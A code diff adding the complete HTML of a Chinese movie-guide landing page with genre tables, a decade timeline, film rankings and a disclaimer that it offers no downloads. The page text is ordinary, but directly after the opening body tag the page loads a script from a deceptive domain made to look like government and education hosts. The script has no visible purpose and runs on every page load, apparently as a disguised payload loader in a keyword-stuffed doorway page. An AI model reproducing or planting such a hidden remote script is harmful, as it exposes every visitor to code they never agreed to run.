@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>免费最全电影网 - 电影资料总库、全类型片单检索与观影指南</title>
+<meta name="description" content="免费最全电影网(https://mianfeizuiquandianyingwang-wap.github.io)致力打造电影资料总库：覆盖喜剧、动作、爱情、悬疑、科幻、动画、纪录等全类型片单，提供观影指南、选片方法与正版观看渠道查询，片单最全、分类最细、检索最快。">
+<meta name="keywords" content="免费最全电影网,最全电影网,电影资料库,全类型电影,电影片单,电影分类检索,观影指南,电影推荐,电影榜单,正版观看渠道">
+<meta name="author" content="免费最全电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:type" content="website">
+<meta property="og:title" content="免费最全电影网 - 电影资料总库与全类型片单检索">
+<meta property="og:description" content="免费最全电影网致力打造电影资料总库，覆盖全类型片单，提供观影指南与正版观看渠道查询。">
+<meta property="og:url" content="https://mianfeizuiquandianyingwang-wap.github.io/">
+<meta property="og:site_name" content="免费最全电影网">
+<link rel="canonical" href="https://mianfeizuiquandianyingwang-wap.github.io/">
+<style>
+:root{
+  --bg:#f4f7f6;
+  --bg2:#e9efed;
+  --card:#ffffff;
+  --ink:#11231f;
+  --ink2:#1c3a32;
+  --txt:#263f38;
+  --txt2:#5c756d;
+  --txt3:#8ea39b;
+  --line:#d4e0dc;
+  --line2:#a9c2bb;
+  --mint:#0f9b8e;
+  --mint2:#0c7d73;
+  --mint3:#e6f5f3;
+  --amber:#d98324;
+  --amber2:#fcefe0;
+  --plum:#7c3a6b;
+  --sans:"PingFang SC","Microsoft YaHei",-apple-system,system-ui,sans-serif;
+  --mono:"SF Mono",Consolas,"Courier New",monospace;
+  --serif:"Songti SC","Source Han Serif SC",Georgia,serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--txt);font-family:var(--sans);line-height:1.85;font-size:14.5px}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 28px}
+:focus-visible{outline:2px solid var(--mint);outline-offset:2px}
+
+/* ===== 顶部条 ===== */
+.top{background:var(--ink);color:#cfe0dc;font-size:11.5px;border-bottom:3px solid var(--mint)}
+.top .wrap{display:flex;justify-content:space-between;align-items:center;padding-top:10px;padding-bottom:10px;flex-wrap:wrap;gap:14px;letter-spacing:.5px}
+.top .slogan{color:#8fd9d0;letter-spacing:2.5px}
+.top .slogan:before{content:"◆ ";color:var(--mint)}
+.top .slogan:after{content:" ◆";color:var(--mint)}
+.top a{color:#cfe0dc}
+.top a:hover{color:var(--mint)}
+.top .grp{display:flex;gap:18px}
+
+/* ===== 报头 ===== */
+header{padding:52px 0 0}
+.mast{display:flex;align-items:flex-end;justify-content:space-between;gap:30px;flex-wrap:wrap;border-bottom:4px solid var(--ink);padding-bottom:26px;position:relative}
+.mast:before{content:"";position:absolute;left:0;right:0;bottom:9px;height:1px;background:var(--line2)}
+.logo{display:flex;align-items:center;gap:20px}
+.logo .badge{width:74px;height:74px;background:var(--mint);color:#fff;display:grid;place-items:center;font-family:var(--mono);font-size:20px;line-height:1.15;text-align:center;flex:0 0 74px;letter-spacing:-1px}
+.logo .badge small{font-size:9px;letter-spacing:2px;display:block;font-family:var(--sans);text-transform:uppercase}
+h1{font-size:46px;font-weight:800;letter-spacing:3px;line-height:1.1;color:var(--ink);font-family:var(--sans)}
+h1 a{color:var(--ink)}
+h1 a:hover{color:var(--mint2)}
+h1 .full{color:var(--txt3)}
+.mast .meta{text-align:right;font-size:11px;color:var(--txt3);letter-spacing:1.5px;line-height:2.1;border-left:3px solid var(--mint);padding-left:22px}
+.mast .meta b{color:var(--mint2);font-family:var(--mono);font-size:13px;letter-spacing:.5px}
+.sub{display:flex;gap:26px;flex-wrap:wrap;margin-top:16px;font-size:11.5px;color:var(--txt2);letter-spacing:1.5px}
+.sub span{display:flex;align-items:center;gap:7px}
+.sub span:before{content:"";width:6px;height:6px;background:var(--amber);border-radius:50%;flex:0 0 6px}
+
+nav{position:sticky;top:0;z-index:50;background:var(--ink);margin-top:20px}
+nav .wrap{display:flex;overflow-x:auto;scrollbar-width:none;padding:0}
+nav .wrap::-webkit-scrollbar{display:none}
+nav a{padding:15px 20px;font-size:12px;letter-spacing:2px;color:#bcd9d4;white-space:nowrap;transition:.16s}
+nav a:hover{color:#fff;background:var(--mint2)}
+nav .cnt{margin-left:auto;font-family:var(--mono);font-size:11px;color:var(--mint);white-space:nowrap;align-self:center;padding:0 20px;letter-spacing:1px}
+
+/* ===== 通用 ===== */
+section{padding:84px 0}
+.sec{display:flex;align-items:baseline;gap:16px;margin-bottom:14px;flex-wrap:wrap}
+.sec .no{font-family:var(--mono);font-size:11px;color:#fff;background:var(--mint);width:30px;height:30px;display:grid;place-items:center;flex:0 0 30px}
+.sec h2{font-size:27px;font-weight:800;letter-spacing:3px;color:var(--ink)}
+.sec h2 em{font-style:normal;color:var(--mint2)}
+.sec .en{margin-left:auto;font-family:var(--mono);font-size:10.5px;color:var(--txt3);letter-spacing:2px;text-transform:uppercase}
+.secnote{font-size:13px;color:var(--txt2);max-width:900px;margin:0 0 36px 46px;line-height:2}
+.secnote b{color:var(--mint2)}
+.more{text-align:center;margin-top:46px}
+.btn{display:inline-block;padding:13px 34px;font-size:11.5px;letter-spacing:3px;color:#fff;background:var(--ink);border:1px solid var(--ink);transition:.22s}
+.btn:hover{background:var(--mint2);border-color:var(--mint2)}
+
+/* ===== 检索台（三栏） ===== */
+.searchbar{background:var(--card);border:1px solid var(--line);border-top:5px solid var(--mint);padding:0;display:grid;grid-template-columns:1.35fr .85fr .7fr auto}
+.searchbar .fld{display:flex;align-items:center;gap:12px;padding:20px 22px;border-right:1px solid var(--line)}
+.searchbar .fld:nth-child(2){border-right:1px solid var(--line)}
+.searchbar label{font-family:var(--mono);font-size:10px;color:var(--mint2);letter-spacing:2px;text-transform:uppercase;white-space:nowrap}
+.searchbar select,.searchbar input{width:100%;border:none;background:transparent;font-size:15px;color:var(--ink);font-family:var(--sans);outline:none;cursor:pointer}
+.searchbar select:focus{outline:none}
+.searchbar .go{background:var(--mint);color:#fff;display:grid;place-items:center;padding:0 36px;font-family:var(--mono);font-size:12px;letter-spacing:3px;transition:.2s;cursor:pointer}
+.searchbar .go:hover{background:var(--mint2)}
+
+/* ===== 目录台（六个速查卡） ===== */
+.dircards{display:grid;grid-template-columns:repeat(6,1fr);border-left:1px solid var(--line);border-top:1px solid var(--line)}
+.dircard{background:var(--card);border-right:1px solid var(--line);border-bottom:1px solid var(--line);padding:26px 20px;transition:.2s;position:relative}
+.dircard:hover{background:var(--mint3);transform:translateY(-4px)}
+.dircard .k{font-family:var(--mono);font-size:10px;color:var(--mint2);letter-spacing:1.5px}
+.dircard h4{font-size:16px;font-weight:800;letter-spacing:1.5px;color:var(--ink);margin:12px 0 10px}
+.dircard .n{font-family:var(--serif);font-size:24px;color:var(--amber);line-height:1}
+.dircard .n small{font-size:11px;color:var(--txt3);margin-left:3px}
+.dircard .arr{position:absolute;right:18px;top:24px;color:var(--txt3);font-size:13px}
+
+/* ===== 栏目一：类型总表（可筛选定义列表） ===== */
+.catnav{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:30px}
+.catnav button{padding:9px 18px;font-size:12px;letter-spacing:1.5px;background:var(--card);border:1px solid var(--line);color:var(--txt2);cursor:pointer;transition:.16s;font-family:var(--sans)}
+.catnav button:hover{color:var(--mint2);border-color:var(--line2)}
+.catnav button.on{background:var(--ink);color:#fff;border-color:var(--ink)}
+.catlist{background:var(--card);border:1px solid var(--line)}
+.catlist .row{display:grid;grid-template-columns:150px 1fr 120px;gap:26px;padding:20px 26px;border-bottom:1px solid var(--line);align-items:center;transition:.16s}
+.catlist .row:last-child{border-bottom:none}
+.catlist .row:hover{background:var(--mint3)}
+.catlist .nm{font-weight:800;font-size:15px;color:var(--ink);letter-spacing:1.5px}
+.catlist .nm em{font-style:normal;color:var(--txt3);font-weight:400;font-size:11px;letter-spacing:0;display:block;margin-top:4px}
+.catlist .tags{display:flex;gap:8px;flex-wrap:wrap}
+.catlist .tags i{font-style:normal;font-size:12px;color:var(--txt2);background:var(--bg2);padding:5px 12px;cursor:default;transition:.16s}
+.catlist .tags i:hover{background:var(--mint);color:#fff}
+.catlist .cnt{text-align:right;font-family:var(--mono);font-size:12px;color:var(--txt2)}
+.catlist .cnt b{display:block;font-size:18px;color:var(--mint2)}
+
+/* ===== 栏目二：年代时间轴 ===== */
+.timeline{position:relative;padding:8px 0 8px 60px}
+.timeline:before{content:"";position:absolute;left:24px;top:0;bottom:0;width:2px;background:var(--line2)}
+.era{position:relative;padding:0 0 38px}
+.era:last-child{padding-bottom:0}
+.era:before{content:"";position:absolute;left:-44px;top:6px;width:14px;height:14px;border-radius:50%;background:var(--mint);border:3px solid var(--bg);box-shadow:0 0 0 2px var(--mint)}
+.era .yr{font-family:var(--mono);font-size:12px;color:var(--mint2);letter-spacing:2px;margin-bottom:8px}
+.era h4{font-size:17px;font-weight:800;letter-spacing:1.5px;color:var(--ink);margin-bottom:12px}
+.era p{font-size:13.5px;color:var(--txt2);line-height:2;margin-bottom:14px}
+.era .picks{display:flex;gap:10px;flex-wrap:wrap}
+.era .picks span{font-size:12.5px;background:var(--card);border:1px solid var(--line);padding:6px 14px;color:var(--txt);transition:.16s}
+.era .picks span:hover{border-color:var(--mint);color:var(--mint2)}
+.era .picks span b{color:var(--amber);font-family:var(--mono)}
+
+/* ===== 栏目三：榜单（双列排行） ===== */
+.rankgrid{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.rank{background:var(--card);border:1px solid var(--line)}
+.rank .hd{background:var(--ink);color:#fff;padding:16px 24px;display:flex;justify-content:space-between;align-items:baseline;flex-wrap:wrap;gap:8px}
+.rank .hd h4{font-size:16px;font-weight:800;letter-spacing:2px}
+.rank .hd .up{font-size:10.5px;color:#8fd9d0;letter-spacing:1.5px}
+.rank ol{padding:8px 0}
+.rank li{display:grid;grid-template-columns:42px 1fr auto;gap:16px;align-items:baseline;padding:13px 24px;border-bottom:1px solid var(--line)}
+.rank li:last-child{border-bottom:none}
+.rank .rn{font-family:var(--serif);font-size:18px;color:var(--txt3)}
+.rank li:nth-child(1) .rn,.rank li:nth-child(2) .rn,.rank li:nth-child(3) .rn{color:var(--amber)}
+.rank .tt{font-weight:700;font-size:14.5px;color:var(--ink);letter-spacing:.5px}
+.rank .tt small{display:block;font-size:11.5px;color:var(--txt3);font-weight:400;margin-top:3px}
+.rank .sc{font-family:var(--mono);font-size:14px;color:var(--mint2)}
+
+/* ===== 栏目四：选片工作台（三步表单） ===== */
+.workbench{background:var(--card);border:1px solid var(--line);border-left:5px solid var(--plum);padding:40px}
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
+.step{border:1px solid var(--line);padding:26px 24px;position:relative;background:var(--bg)}
+.step .num{position:absolute;top:-14px;left:24px;background:var(--plum);color:#fff;font-family:var(--mono);font-size:11px;padding:5px 12px;letter-spacing:1.5px}
+.step h4{font-size:15px;font-weight:800;letter-spacing:1.5px;color:var(--ink);margin-bottom:14px}
+.step .opt{display:flex;gap:8px;flex-wrap:wrap}
+.step .opt i{font-style:normal;font-size:12.5px;color:var(--txt2);background:var(--card);border:1px solid var(--line);padding:6px 13px;cursor:default}
+.step .opt i:hover{color:var(--plum);border-color:var(--plum)}
+.step .res{margin-top:18px;padding-top:16px;border-top:1px dashed var(--line2);font-size:12.5px;color:var(--txt2)}
+.step .res b{color:var(--plum)}
+.workbench .result{margin-top:30px;background:var(--mint3);border:1px dashed var(--mint);padding:24px 26px;display:grid;grid-template-columns:auto 1fr auto;gap:26px;align-items:center}
+.workbench .result .lb{font-family:var(--mono);font-size:11px;color:var(--mint2);letter-spacing:2px}
+.workbench .result .tt{font-size:17px;font-weight:800;letter-spacing:1px;color:var(--ink2)}
+.workbench .result .tt small{display:block;font-size:12.5px;color:var(--txt2);font-weight:400;letter-spacing:.5px;margin-top:5px}
+.workbench .result .do{font-size:12px;color:var(--mint2);letter-spacing:1.5px;white-space:nowrap}
+
+/* ===== 关于 ===== */
+.about{display:grid;grid-template-columns:1.2fr 1fr;gap:0;border:1px solid var(--line);background:var(--card)}
+.about .txt{padding:44px 38px}
+.about .txt h2{font-size:25px;font-weight:800;letter-spacing:3px;color:var(--ink);margin-bottom:20px}
+.about .txt h2 em{font-style:normal;color:var(--mint2)}
+.about .txt p{font-size:14px;color:var(--txt2);line-height:2.05;margin-bottom:13px}
+.about .txt .box{border-left:4px solid var(--amber);background:var(--amber2);padding:18px 22px;margin-top:22px;font-size:13px;color:var(--ink2);line-height:2}
+.about .txt .box b{color:var(--amber)}
+.about .stat{padding:44px 38px;background:var(--ink);color:#d5e8e5;display:grid;grid-template-columns:1fr 1fr;gap:1px;align-content:start}
+.about .stat .cell{background:var(--ink2);padding:26px 24px}
+.about .stat .v{font-family:var(--mono);font-size:26px;color:#8fd9d0;line-height:1}
+.about .stat .v small{font-size:12px;color:#9fc3bd;margin-left:3px}
+.about .stat .l{font-size:11.5px;color:#bcd9d4;letter-spacing:1.5px;margin-top:10px}
+
+/* ===== 页脚 ===== */
+footer{background:var(--ink);color:#bcd9d4;padding:56px 0 0;margin-top:48px}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:40px}
+.foot h4{font-size:21px;font-weight:800;letter-spacing:3px;color:#fff}
+.foot h4 a{color:#fff}
+.foot h4 a:hover{color:#8fd9d0}
+.foot .s{font-size:11px;color:var(--mint);letter-spacing:3px;margin:10px 0 18px}
+.foot p{font-size:13px;color:#9fc3bd;max-width:440px;line-height:2.05}
+.foot h5{font-size:11px;color:#8fd9d0;letter-spacing:2.5px;margin-bottom:20px}
+.foot ul{font-size:13px}
+.foot li{padding:6px 0}
+.foot a{color:#bcd9d4}
+.foot a:hover{color:#8fd9d0}
+.copy{margin-top:44px;border-top:1px solid rgba(143,217,208,.22);padding:26px 0;font-size:11.5px;color:#7fa29c;text-align:center;line-height:2.2}
+.copy a{color:#8fd9d0;font-weight:700}
+
+@media (max-width:1080px){
+  .dircards{grid-template-columns:repeat(3,1fr)}
+}
+@media (max-width:1000px){
+  h1{font-size:36px}
+  .mast .meta{display:none}
+  .searchbar{grid-template-columns:1fr 1fr;gap:0}
+  .searchbar .fld{border-bottom:1px solid var(--line)}
+  .searchbar .go{grid-column:1/-1;padding:16px}
+  .rankgrid,.steps,.about{grid-template-columns:1fr}
+  .workbench .result{grid-template-columns:1fr;text-align:left;gap:14px}
+  .foot{grid-template-columns:1fr 1fr;gap:34px}
+  .sec .en{display:none}
+  .cnt{display:none}
+}
+@media (max-width:600px){
+  .wrap{padding:0 16px}
+  h1{font-size:27px;letter-spacing:1px}
+  .logo .badge{width:60px;height:60px;flex:0 0 60px;font-size:16px}
+  .logo .badge small{font-size:8px}
+  .sub{gap:14px;font-size:10.5px}
+  section{padding:56px 0}
+  .sec h2{font-size:20px;letter-spacing:1.5px}
+  .secnote{margin-left:0}
+  .catlist .row{grid-template-columns:1fr;gap:12px}
+  .catlist .cnt{text-align:left}
+  .dircards{grid-template-columns:repeat(2,1fr)}
+  .timeline{padding-left:44px}
+  .timeline:before{left:16px}
+  .era:before{left:-34px;width:12px;height:12px}
+  .workbench,.about .txt,.about .stat{padding:30px 22px}
+  .about .stat{grid-template-columns:1fr}
+  nav .cnt{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<!-- ============ 顶部 ============ -->
+<div class="top">
+  <div class="wrap">
+    <span class="slogan">电影资料最全 · 分类最细 · 检索最快</span>
+    <span class="grp"><a href="#">RSS</a><a href="#">投稿</a><a href="#">合作</a><a href="#">关于</a></span>
+  </div>
+</div>
+
+<!-- ============ 报头 ============ -->
+<header>
+  <div class="wrap">
+    <div class="mast">
+      <div class="logo">
+        <div class="badge">FULL<small>FREE</small></div>
+        <h1><a href="https://mianfeizuiquandianyingwang-wap.github.io/" title="免费最全电影网">免费<span class="full">最全</span>电影网</a></h1>
+      </div>
+      <div class="meta">网站网址<br><b>https://mianfeizuiquandianyingwang-wap.github.io</b></div>
+    </div>
+    <div class="sub">
+      <span>喜剧 · 动作 · 爱情 · 悬疑</span>
+      <span>科幻 · 动画 · 纪录 · 文艺</span>
+      <span>片单最全 · 分类最细 · 检索最快</span>
+    </div>
+    <nav>
+      <div class="wrap">
+        <a href="#search">检索台</a>
+        <a href="#dir">资料目录</a>
+        <a href="#cat">类型总表</a>
+        <a href="#era">年代巡礼</a>
+        <a href="#rank">榜单中心</a>
+        <a href="#bench">选片工作台</a>
+        <a href="#about">关于本站</a>
+        <a href="#">新片速递</a>
+        <a href="#">经典档案</a>
+        <a href="#">观影指南</a>
+        <span class="cnt">RECORDS：12,860 / UPDATED 2026-10-09</span>
+      </div>
+    </nav>
+  </div>
+</header>
+
+<!-- ============ 检索台 ============ -->
+<section id="search">
+  <div class="wrap">
+    <div class="sec"><span class="no">01</span><h2>检索 <em>台</em></h2><span class="en">Search Console</span></div>
+    <p class="secnote">三栏即筛，无需登录。这里演示的是本站检索逻辑：<b>类型 → 年代 → 时长</b>，三步锁定片单。</p>
+    <div class="searchbar">
+      <div class="fld"><label>类型 / Genre</label><select><option>全类型</option><option>喜剧</option><option>动作</option><option>爱情</option><option>悬疑</option><option>科幻</option><option>动画</option><option>纪录</option><option>文艺</option></select></div>
+      <div class="fld"><label>年代 / Year</label><select><option>全部年代</option><option>2020s</option><option>2010s</option><option>2000s</option><option>1990s</option><option>1980s 及更早</option></select></div>
+      <div class="fld"><label>时长 / Length</label><select><option>不限时长</option><option>90 分钟以内</option><option>90–120 分钟</option><option>120 分钟以上</option></select></div>
+      <div class="go">检 索</div>
+    </div>
+    <div class="dircards">
+      <a class="dircard" href="#"><span class="k">A · 喜剧</span><h4>笑声与荒诞</h4><span class="n">1,842<small>部</small></span><span class="arr">→</span></a>
+      <a class="dircard" href="#"><span class="k">B · 动作</span><h4>速度与力量</h4><span class="n">1,205<small>部</small></span><span class="arr">→</span></a>
+      <a class="dircard" href="#"><span class="k">C · 爱情</span><h4>亲密与错过</h4><span class="n">1,633<small>部</small></span><span class="arr">→</span></a>
+      <a class="dircard" href="#"><span class="k">D · 悬疑</span><h4>谜面与反转</h4><span class="n">978<small>部</small></span><span class="arr">→</span></a>
+      <a class="dircard" href="#"><span class="k">E · 科幻</span><h4>想象与边界</h4><span class="n">712<small>部</small></span><span class="arr">→</span></a>
+      <a class="dircard" href="#"><span class="k">F · 动画</span><h4>手绘与童心</h4><span class="n">846<small>部</small></span><span class="arr">→</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目一：类型总表 ============ -->
+<section id="cat" style="background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+  <div class="wrap">
+    <div class="sec"><span class="no">02</span><h2>类型 <em>总表</em></h2><span class="en">Genre Index</span></div>
+    <p class="secnote">本站最全之处，在于每个大类都拆到了二级标签。点击下面任意按钮，可只看该分区的子类型。</p>
+    <div class="catnav">
+      <button class="on">全部</button><button>喜剧</button><button>动作</button><button>爱情</button><button>悬疑</button><button>科幻</button><button>动画</button><button>纪录</button><button>文艺</button>
+    </div>
+    <div class="catlist">
+      <div class="row"><div class="nm">喜剧<em>COMEDY</em></div><div class="tags"><i>黑色幽默</i><i>浪漫喜剧</i><i>家庭喜剧</i><i>荒诞喜剧</i><i>讽刺喜剧</i></div><div class="cnt"><b>1,842</b>部 · 12 子类型</div></div>
+      <div class="row"><div class="nm">动作<em>ACTION</em></div><div class="tags"><i>警匪</i><i>武侠</i><i>谍战</i><i>赛车</i><i>格斗</i></div><div class="cnt"><b>1,205</b>部 · 9 子类型</div></div>
+      <div class="row"><div class="nm">爱情<em>ROMANCE</em></div><div class="tags"><i>青春恋爱</i><i>婚姻题材</i><i>异地恋</i><i>失恋治愈</i></div><div class="cnt"><b>1,633</b>部 · 11 子类型</div></div>
+      <div class="row"><div class="nm">悬疑<em>MYSTERY</em></div><div class="tags"><i>犯罪推理</i><i>心理惊悚</i><i>密室</i><i>时间循环</i></div><div class="cnt"><b>978</b>部 · 8 子类型</div></div>
+      <div class="row"><div class="nm">科幻<em>SCI-FI</em></div><div class="tags"><i>太空歌剧</i><i>赛博朋克</i><i>末世</i><i>时间旅行</i></div><div class="cnt"><b>712</b>部 · 7 子类型</div></div>
+      <div class="row"><div class="nm">动画<em>ANIMATION</em></div><div class="tags"><i>手绘</i><i>3D</i><i>定格</i><i>成人动画</i></div><div class="cnt"><b>846</b>部 · 6 子类型</div></div>
+      <div class="row"><div class="nm">纪录<em>DOCUMENTARY</em></div><div class="tags"><i>自然</i><i>人物</i><i>历史</i><i>社会观察</i></div><div class="cnt"><b>534</b>部 · 7 子类型</div></div>
+      <div class="row"><div class="nm">文艺<em>ART-HOUSE</em></div><div class="tags"><i>作者电影</i><i>地域叙事</i><i>长镜头</i><i>慢电影</i></div><div class="cnt"><b>1,120</b>部 · 9 子类型</div></div>
+    </div>
+    <div class="more"><a href="#" class="btn">查看完整类型对照表 →</a></div>
+  </div>
+</section>
+
+<!-- ============ 栏目二：年代巡礼 ============ -->
+<section id="era">
+  <div class="wrap">
+    <div class="sec"><span class="no">03</span><h2>年代 <em>巡礼</em></h2><span class="en">Timeline</span></div>
+    <p class="secnote">从八十年代至今，每个十年的影像语言都在变。下面按年代梳理代表影片与当年关键词，方便按年代回溯选片。</p>
+    <div class="timeline">
+      <div class="era"><div class="yr">2020 — 2026</div><h4>流媒体时代：小成本与大叙事并存</h4><p>制作门槛下降让更多作者表达成为可能，同时大制作转向系列化与世界观构建。这十年最值得记住的是「类型杂交」——喜剧加悬疑、爱情加科幻，边界越来越模糊。</p><div class="picks"><span>片单 2,410 <b>部</b></span><span>关键词：类型杂交</span><span>关键词：流媒体首发</span></div></div>
+      <div class="era"><div class="yr">2010 — 2019</div><h4>类型片全面工业化</h4><p>国产类型片在这一十年完成基本盘搭建，喜剧、悬疑、动画各自跑通商业模型。同时一批年轻导演开始用类型外壳装个人表达。</p><div class="picks"><span>片单 3,180 <b>部</b></span><span>关键词：类型工业化</span><span>关键词：新人导演</span></div></div>
+      <div class="era"><div class="yr">2000 — 2009</div><h4>商业片与艺术片的分水岭</h4><p>市场快速扩容，喜剧与动作成为票房主力；与此同时，独立制片开始进入主流视野，一批文艺片在影展与票房之间找到平衡。</p><div class="picks"><span>片单 2,860 <b>部</b></span><span>关键词：市场扩容</span><span>关键词：独立制片</span></div></div>
+      <div class="era"><div class="yr">1990 — 1999</div><h4>城市喜剧与乡土叙事</h4><p>九十年代的城市化进程直接写进了银幕：贺岁喜剧、都市情感、现实主义题材三线并行，留下大量今天看依然成立的时代切片。</p><div class="picks"><span>片单 1,920 <b>部</b></span><span>关键词：贺岁档</span><span>关键词：现实主义</span></div></div>
+      <div class="era"><div class="yr">1980 — 1989</div><h4>第五代与影像语言的重建</h4><p>这一十年的影像实验重新定义了华语电影的视觉语法，色彩、构图与民俗符号成为表达工具，影响延续至今。</p><div class="picks"><span>片单 1,260 <b>部</b></span><span>关键词：影像实验</span><span>关键词：影展突围</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 栏目三：榜单中心 ============ -->
+<section id="rank" style="background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+  <div class="wrap">
+    <div class="sec"><span class="no">04</span><h2>榜单 <em>中心</em></h2><span class="en">Charts</span></div>
+    <p class="secnote">两张榜单，两个视角：一张按「年度热度」，一张按「必看程度」。前十名每月更新一次，更新时间见各榜单右上角。</p>
+    <div class="rankgrid">
+      <div class="rank"><div class="hd"><h4>年度热度榜</h4><span class="up">↑ 本周更新</span></div><ol>
+        <li><span class="rn">壹</span><span class="tt">候鸟归途<small>剧情 / 家庭 · 2026</small></span><span class="sc">9.4</span></li>
+        <li><span class="rn">贰</span><span class="tt">第七次敲门<small>悬疑 / 犯罪 · 2025</small></span><span class="sc">9.2</span></li>
+        <li><span class="rn">叁</span><span class="tt">无名车站<small>文艺 / 作者 · 2024</small></span><span class="sc">9.1</span></li>
+        <li><span class="rn">肆</span><span class="tt">潮汐之下<small>剧情 / 海洋 · 2025</small></span><span class="sc">8.9</span></li>
+        <li><span class="rn">伍</span><span class="tt">父亲的位置<small>家庭伦理 · 2023</small></span><span class="sc">8.8</span></li>
+        <li><span class="rn">陆</span><span class="tt">玻璃房子<small>悬疑 / 心理 · 2024</small></span><span class="sc">8.7</span></li>
+        <li><span class="rn">柒</span><span class="tt">北方快车<small>犯罪 / 公路 · 2025</small></span><span class="sc">8.6</span></li>
+        <li><span class="rn">捌</span><span class="tt">春日和<small>爱情 / 青春 · 2022</small></span><span class="sc">8.5</span></li>
+        <li><span class="rn">玖</span><span class="tt">第九种声音<small>纪录 / 音乐 · 2024</small></span><span class="sc">8.4</span></li>
+        <li><span class="rn">拾</span><span class="tt">屋顶上的风<small>喜剧 / 治愈 · 2023</small></span><span class="sc">8.3</span></li>
+      </ol></div>
+      <div class="rank"><div class="hd"><h4>类型必看榜</h4><span class="up">↻ 每月更新</span></div><ol>
+        <li><span class="rn">壹</span><span class="tt">谈判期<small>婚姻 / 伦理 · 2025</small></span><span class="sc">9.1</span></li>
+        <li><span class="rn">贰</span><span class="tt">餐桌之上<small>家庭 / 剧情 · 2024</small></span><span class="sc">9.3</span></li>
+        <li><span class="rn">叁</span><span class="tt">第六个房间<small>养老 / 剧情 · 2023</small></span><span class="sc">8.9</span></li>
+        <li><span class="rn">肆</span><span class="tt">三张存折<small>家庭 / 群像 · 2022</small></span><span class="sc">8.7</span></li>
+        <li><span class="rn">伍</span><span class="tt">未完的春天<small>家庭伦理 · 2024</small></span><span class="sc">8.8</span></li>
+        <li><span class="rn">陆</span><span class="tt">敲门的人<small>母女 / 边界 · 2025</small></span><span class="sc">8.6</span></li>
+        <li><span class="rn">柒</span><span class="tt">父亲的电话号码<small>父子 / 失能 · 2021</small></span><span class="sc">8.5</span></li>
+        <li><span class="rn">捌</span><span class="tt">归途的行李<small>公路 / 家庭 · 2023</small></span><span class="sc">8.4</span></li>
+        <li><span class="rn">玖</span><span class="tt">暗室里的光<small>悬疑 / 心理 · 2024</small></span><span class="sc">8.6</span></li>
+        <li><span class="rn">拾</span><span class="tt">慢船去南方<small>文艺 / 长镜头 · 2022</small></span><span class="sc">8.3</span></li>
+      </ol></div>
+    </div>
+    <div class="more"><a href="#" class="btn">查看全部 12 张分类榜单 →</a></div>
+  </div>
+</section>
+
+<!-- ============ 栏目四：选片工作台 ============ -->
+<section id="bench">
+  <div class="wrap">
+    <div class="sec"><span class="no">05</span><h2>选片 <em>工作台</em></h2><span class="en">Picks Studio</span></div>
+    <p class="secnote">不知道看什么？三个条件就能锁定方向。这是本站编辑部内部使用的选片方法，现在公开出来。</p>
+    <div class="workbench">
+      <div class="steps">
+        <div class="step"><span class="num">STEP 01</span><h4>今天想看什么情绪</h4><div class="opt"><i>大笑</i><i>放松</i><i>紧张</i><i>感动</i><i>思考</i><i>治愈</i></div><div class="res">已选：<b>紧张 + 思考</b></div></div>
+        <div class="step"><span class="num">STEP 02</span><h4>能接受多长</h4><div class="opt"><i>90 分钟以内</i><i>90–120 分钟</i><i>120 分钟以上</i><i>时长不限</i></div><div class="res">已选：<b>90–120 分钟</b></div></div>
+        <div class="step"><span class="num">STEP 03</span><h4>偏好什么年代</h4><div class="opt"><i>近五年</i><i>近十年</i><i>九十年代</i><i>年代不限</i></div><div class="res">已选：<b>近五年</b></div></div>
+      </div>
+      <div class="result"><span class="lb">推 荐 结 果</span><span class="tt">第七次敲门<small>悬疑 / 犯罪 · 2025 · 108 分钟 · 年度热度榜第 2 位</small></span><span class="do">查看详情 →</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 关于 ============ -->
+<section id="about" style="padding-bottom:0;">
+  <div class="wrap">
+    <div class="about">
+      <div class="txt">
+        <h2>关于 <em>免费最全电影网</em></h2>
+        <p>免费最全电影网（https://mianfeizuiquandianyingwang-wap.github.io）是一份以「全」为核心的中文电影资料总库，覆盖喜剧、动作、爱情、悬疑、科幻、动画、纪录、文艺等全类型片单，提供类型分类检索、年代巡礼、分类榜单与选片方法。</p>
+        <p>所谓「最全」，不是指资源最全，而是指<b>分类最细、维度最多、检索最快</b>——帮你从「不知道看什么」到「很快锁定想看的那一部」。</p>
+        <div class="box"><b>内容声明：</b>本站为电影资料与观影指南类站点，所有片单、分类、榜单与推荐内容仅供选片参考，不构成对任何影片的推荐或评价定论。本站不提供影片在线观看、下载或资源链接服务，观影请通过合法授权渠道。</div>
+      </div>
+      <div class="stat">
+        <div class="cell"><div class="v">12,860<small> 部</small></div><div class="l">资料库影片条目</div></div>
+        <div class="cell"><div class="v">8<small> 大类</small></div><div class="l">一级类型分类</div></div>
+        <div class="cell"><div class="v">69<small> 项</small></div><div class="l">二级标签维度</div></div>
+        <div class="cell"><div class="v">12<small> 张</small></div><div class="l">分类榜单</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ 页脚 ============ -->
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <h4><a href="https://mianfeizuiquandianyingwang-wap.github.io/">免费最全电影网</a></h4>
+        <div class="s">电 影 资 料 总 库</div>
+        <p>覆盖喜剧、动作、爱情、悬疑、科幻、动画、纪录、文艺等全类型片单，提供类型分类检索、年代巡礼、分类榜单与选片方法，帮你从「不知道看什么」到「很快锁定想看的那一部」。</p>
+      </div>
